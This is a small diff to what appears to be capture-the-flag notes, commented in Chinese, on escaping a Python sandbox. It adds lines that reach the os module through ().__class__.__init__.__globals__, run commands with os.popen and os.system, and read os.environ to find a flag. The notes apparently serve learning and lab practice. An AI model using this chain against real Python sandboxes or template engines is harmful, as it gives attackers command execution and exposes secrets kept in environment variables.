@@ -10,6 +10,11 @@
 ().__class__.__init__.__globals__
 # 掏出全局字典的os
 ().__class__.__init__.__globals__['os']
+# 拿到os模块后开始执行命令
+os=().__class__.__init__.__globals__['os']
+os.popen('whoami').read()    # 执行命令，读回输出
+os.system('id')              # 执行命令，不回显
+os.environ                   # 读环境变量（常藏 flag）
 
 
 
